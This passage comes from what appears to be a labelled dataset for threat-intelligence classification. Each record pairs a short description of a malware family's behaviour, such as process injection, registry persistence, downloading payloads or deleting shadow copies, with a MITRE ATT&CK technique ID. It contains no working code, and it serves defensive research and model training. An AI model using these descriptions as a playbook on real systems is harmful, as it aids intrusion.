    "type": "text",
    "text": "FELIXROOT collects the victim’s computer name, processor architecture, OS version, volume serial number, and system type.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "FELIXROOT collects the username from the victim’s machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "FLASHFLOOD searches for interesting files (either a default or customized set of file extensions) on the local system. FLASHFLOOD will scan the My Recent Documents, Desktop, Temporary Internet Files, and TEMP directories. FLASHFLOOD also collects information stored in the Windows Address Book.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "FLASHFLOOD searches for interesting files (either a default or customized set of file extensions) on the local system and removable media.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "QakBot can use a variety of commands, including esentutl.exe to steal sensitive data from Internet Explorer and Microsoft Edge, to acquire information that is subsequently exfiltrated.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "QakBot can identify whether it has been run previously on a host by checking for a specified folder.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "QakBot has the ability to download additional components and malware.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "QakBot can store its configuration information in a randomly named subkey under HKCU\\Software\\Microsoft.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "QakBot can use GetProcAddress to help delete malicious strings from memory.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "QakBot has the ability to check running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "QakBot can inject itself into processes including explore.exe, Iexplore.exe, and Mobsync.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "QakBot can use process hollowing to execute its main payload.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "QakBot can collect system information including the OS version and domain on a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "QakBot can use net config workstation, arp -a, and ipconfig /all to gather network configuration information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "QakBot can measure the download speed on a targeted host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "QakBot can identify the user name on a compromised system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "QakBot can execute WMI queries to gather information.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Conficker downloads an HTTP server to the infected machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Conficker adds keys to the Registry at HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services and various other Registry locations.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "ChChes collects its process identifier (PID) on the victim.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Gelsemium can collect data from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Gelsemium can retrieve data from specific Windows directories, as well as open random files as part of Virtualization/Sandbox Evasion.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Gelsemium can download additional plug-ins to a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Gelsemium has the ability to store its components in the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Gelsemium has the ability to use various Windows API functions to perform tasks.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Gelsemium can enumerate running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Gelsemium has the ability to inject DLLs into specific processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Gelsemium can open random files and Registry keys to obscure malware behavior from sandbox analysis.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Gelsemium can determine the operating system and whether a targeted machine has a 32 or 64 bit architecture.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Gelsemium has the ability to distinguish between a standard user and an administrator on a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Agent Tesla can download additional files for execution on the victim’s machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Agent Tesla can achieve persistence by modifying Registry key entries.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Agent Tesla can list the current running processes on the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Agent Tesla can inject into known, vulnerable binaries on targeted hosts.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Agent Tesla has used process hollowing to create and manipulate processes through sections of unmapped memory by reallocating that space with its malicious code.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Agent Tesla can collect the system's computer name and also has the capability to collect information on the processor, memory, OS, and video card from the system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Agent Tesla can collect the IP address of the victim machine and spawn instances of netsh.exe to enumerate wireless settings.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Agent Tesla can collect the username from the victim’s machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Agent Tesla has used wmi queries to gather information from the system.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "LiteDuke has the ability to download files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "LiteDuke can query the Registry to check for the presence of HKCU\\Software\\KasperskyLab.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "LiteDuke can enumerate the CPUID and BIOS version on a compromised system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "LiteDuke has the ability to discover the proxy configuration of Firefox and/or Opera.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "LiteDuke can enumerate the account name on a targeted system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "POWRUNER may collect network configuration data by running ipconfig /all on a victim.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Meteor has the ability to download additional files for execution on the victim's machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Meteor can use WinAPI to remove a victim machine from an Active Directory domain.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Meteor can check if a specific process is running, such as Kaspersky's avp.exe.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Meteor has the ability to discover the hostname of a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Meteor can use wmic.exe as part of its effort to delete shadow copies.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "ShimRatReporter had the ability to download additional payloads.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "ShimRatReporter used several Windows API functions to gather information from the infected system.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "ShimRatReporter listed all running processes on the machine.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "ShimRatReporter gathered the operating system name and specific Windows version of an infected machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "ShimRatReporter gathered the local proxy, domain, IP, routing tables, mac address, gateway, DNS servers, and DHCP status information from an infected host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Get2 has the ability to identify running processes on an infected host.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Get2 has the ability to inject DLLs into processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Get2 has the ability to identify the computer name and Windows version of an infected host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Get2 has the ability to identify the current username of an infected host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Lokibot can search for specific files on an infected host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Lokibot downloaded several staged items onto the victim's machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Lokibot has modified the Registry as part of its UAC bypass process.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Lokibot has used LoadLibrary(), GetProcAddress() and CreateRemoteThread() API functions to execute its shellcode.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Lokibot has used process hollowing to inject itself into legitimate Windows process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Lokibot has the ability to discover the computer name and Windows product name/version.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Lokibot has the ability to discover the domain name of the infected host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Lokibot has the ability to discover the username on the infected host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "GoldFinder performed HTTP GET requests to check internet connectivity and identify HTTP proxy servers and other redirectors that an HTTP request traveled through.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "AutoIt backdoor is capable of identifying documents on the victim with the following extensions: .doc; .pdf, .csv, .ppt, .docx, .pst, .xls, .xlsx, .pptx, and .jpeg.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Bad Rabbit has used various Windows API calls.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Bad Rabbit can enumerate all running processes to compare hashes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "StreamEx has the ability to modify the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Waterbear can receive and load executables from remote C2 servers.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Waterbear has deleted certain values from the Registry to load a malicious DLL.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Waterbear can leverage API functions for execution.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Waterbear can identify the process for a specific security product.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Waterbear can inject decrypted shellcode into the LanmanServer service.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Waterbear can use thread injection to inject shellcode into the process of security software.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Waterbear can query the Registry key \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSDTC\\MTxOCI\" to see if the value OracleOcilib exists.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "CookieMiner has retrieved iPhone text messages from iTunes phone backup files.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "CookieMiner has looked for files in the user's home directory with \"wallet\" in their name using find.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "CookieMiner can download additional scripts from a web server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Comnie uses the tasklist to view running processes on the victim’s machine.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Comnie uses ipconfig /all and route PRINT to identify network adapter and interface information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "RTM can check for specific files and directories associated with virtualization and malware analysis.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "RTM can delete all Registry entries created during its execution.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "RTM can use the FindNextUrlCacheEntryA and FindFirstUrlCacheEntryA functions to search for specific strings within browser history.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Siloscape searches for the Kubernetes config file and other related files using a regular expression.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Siloscape makes various native API calls.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Cannon can obtain victim drive information as well as a list of folders in C:\\Program Files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Cannon can gather system information from the victim’s machine such as the OS version, machine name, and drive information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Mosquito stores configuration values under the Registry key HKCU\\Software\\Microsoft[dllname] and modifies Registry keys under HKCR\\CLSID...\\InprocServer32with a path to the launcher.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Mosquito leverages the CreateProcess() and LoadLibrary() calls to execute files with the .dll and .exe extensions.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Mosquito runs whoami on the victim’s machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Pay2Key has the ability to gather the hostname of the victim machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Pay2Key can identify the IP and MAC addresses of the compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "GuLoader can download further malware for execution on the victim's machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "GuLoader can use a number of different APIs for discovery and execution.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "GuLoader has the ability to inject shellcode into a donor processes that is started in a suspended state. GuLoader has previously used RegAsm as a donor process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "DEATHRANSOM can use loop operations to enumerate directories on a compromised host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "DEATHRANSOM can download files to a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "DEATHRANSOM can enumerate logical drives on a target system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "DEATHRANSOM has the ability to use WMI to delete volume shadow copies.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Forfiles can be used to act on (ex: copy, move, etc.) files/directories in a system during (ex: copy files into a staging area before).",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Forfiles can be used to locate certain types of files/directories in a system.(ex: locate all files with a specific extension, name, and/or age)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "BLUELIGHT can enumerate files and collect associated metadata.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "BLUELIGHT can download additional files onto the host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "BLUELIGHT can collect process filenames and SID authority level.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "BLUELIGHT has collected the computer name and OS version from victim machines.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "BLUELIGHT can collect IP information from the victim’s machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "BLUELIGHT can collect the username on a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Tomiris has the ability to collect recent files matching a hardcoded list of extensions prior to exfiltration.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Tomiris can download files and execute them on a victim's system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "ProLock can use WMIC to execute scripts on targeted hosts.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "WellMess can send files from the victim machine to C2.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "WellMess can write files to a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "WellMess can identify the computer name of a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "WellMess can identify the IP address and user domain on the target machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "WellMess can collect the username on the victim machine to send to C2.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "SombRAT has collected data and files from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "SombRAT can execute enum to enumerate files in storage on a compromised system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "SombRAT has the ability to download and execute additional payloads.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "SombRAT has the ability to respawn itself using ShellExecuteW and CreateProcessW.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "SombRAT can use the getprocesslist command to enumerate processes on a compromised host.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "SombRAT can execute loadfromfile, loadfromstorage, and loadfrommem to inject a DLL from disk, storage, or memory respectively.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "SombRAT can execute getinfo to enumerate the computer name and OS version of a compromised system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "SombRAT can execute getinfo to identify the username on a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Volgmer stores the encoded configuration file in the Registry key HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Security.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Volgmer executes payloads using the Windows API call CreateProcessW().",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "SynAck can manipulate Registry keys.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "NBTscan can be used to collect MAC addresses.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "NBTscan can list active users on the system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Penquin can use the command code do_vslist to send file names, size, and status to C2.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Penquin can execute the command code do_download to retrieve remote files from C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Penquin can report the file system type and disk space of a compromised host to C2.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Penquin can report the IP of the compromised host to attacker controlled infrastructure.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Attor has a plugin that enumerates files with specific extensions on all hard disk drives and stores file information in encrypted log files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Attor can download additional plugins, updates and other files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Attor's dispatcher can modify the Run registry key.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Attor's dispatcher has used CreateProcessW API for execution.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Attor's dispatcher can inject itself into running processes to gain higher privileges and to evade detection.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Attor performs the injection by attaching its code into the APC queue using NtQueueApcThread API.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Attor has opened the registry and performed query searches.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Attor monitors the free disk space on the system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "cmd can be used to copy files to/from a remotely connected external system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "QuasarRAT can download files to the victim’s machine and execute them.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "QuasarRAT has a command to edit the Registry on the victim’s machine.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "QuasarRAT has a command to gather system information from the victim’s machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "SUNBURST collected information from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "SUNBURST had commands to enumerate files and directories.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "SUNBURST delivered different payloads, including TEARDROP in at least one instance.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "SUNBURST had commands that allow an attacker to write or delete registry keys, and was observed stopping services by setting their HKLM\\SYSTEM\\CurrentControlSet\\services\\[service_name]\\Start registry entries to value 4.[3][4] It also deleted previously-created Image File Execution Options (IFEO) Debugger registry values and registry keys related to HTTP proxy to clean up traces of its activity.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "SUNBURST collected a list of process names that were hashed using a FNV-1a + XOR algorithm to check against similarly-hashed hardcoded blocklists.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "SUNBURST collected the registry value HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid from compromised hosts.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "SUNBURST collected hostname, OS version, and device uptime.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "SUNBURST collected all network interface MAC addresses that are up and not loopback devices, as well as IP address, DHCP configuration, and domain information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "SUNBURST collected the username from a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "SUNBURST used the WMI query Select * From Win32_SystemDriver to retrieve a driver listing.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Zeus Panda searches for specific directories on the victim’s machine.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Zeus Panda can download additional malware plug-in modules and execute them on the victim’s machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Zeus Panda modifies several Registry keys under HKCU\\Software\\Microsoft\\Internet Explorer\\ PhishingFilter\\ to disable phishing filters.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Zeus Panda checks for running processes on the victim’s machine.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Kobalos can record the hostname and kernel version of the target machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Kobalos can record the IP address of the target machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "EnvyScout can collect sensitive NTLM material from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "EnvyScout can determine whether the ISO payload was received by a Windows or iOS device.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "PLEAD has the ability to list drives and files on the compromised host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "PLEAD has the ability to upload and download files to and from an infected host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "PLEAD can use ShellExecute to execute applications.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "PLEAD has the ability to list processes on the compromised host.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Kazuar downloads additional plug-ins to load on the victim’s machine, including the ability to upgrade and replace its own binary.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "If running in a Windows environment, Kazuar saves a DLL to disk that is injected into the explorer.exe process to execute the payload. Kazuar can also be configured to inject and execute within specific processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Duqu will inject itself into different processes to evade detection. The selection of the target process is influenced by the security software that is installed on the system (Duqu will inject into different processes depending on which security suite is installed on the infected host).",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries can instruct Duqu to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "P8RAT can download additional payloads to a target system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "P8RAT can check for specific processes associated with virtual environments.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Agent.btz attempts to download an encrypted binary from a specified domain.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Agent.btz collects the network adapter’s IP and MAC address as well as IP addresses of the network adapter’s default gateway, primary/secondary WINS, DHCP, and DNS servers, and saves them into a log file.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Agent.btz obtains the victim username and saves it to a file.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "RATANKBA lists the system’s processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "RATANKBA uses the command reg query \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\InternetSettings\".",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "RATANKBA gathers information about the OS architecture, OS name, and OS version/Service pack.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "RATANKBA gathers the victim’s IP address via the ipconfig -all command.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "TajMahal has the ability to steal documents from the local system including the print spooler queue.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "TajMahal has the ability to index files from drives, user profiles, and removable drives.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "TajMahal can set the KeepPrintedJobs attribute for configured printers in SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Print\\Printers to enable document stealing.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "TajMahal has the ability to identify running processes and associated plugins on an infected host.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "TajMahal has the ability to inject DLLs for malicious plugins into running processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "TajMahal has the ability to identify hardware information, the computer name, and OS information on an infected host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "TajMahal has the ability to identify the MAC address on an infected host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Sykipot may gather a list of running processes by running tasklist /v.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Sykipot injects itself into running instances of outlook.exe, iexplore.exe, or firefox.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Sykipot may use ipconfig /all to gather system network configuration details.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Winnti for Linux has the ability to deploy modules directly from command and control (C2) servers, possibly for remote command execution, file exfiltration, and socks5 proxying on the infected host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "DarkWatchman can collect files from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "DarkWatchman has the ability to enumerate file and folder names.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
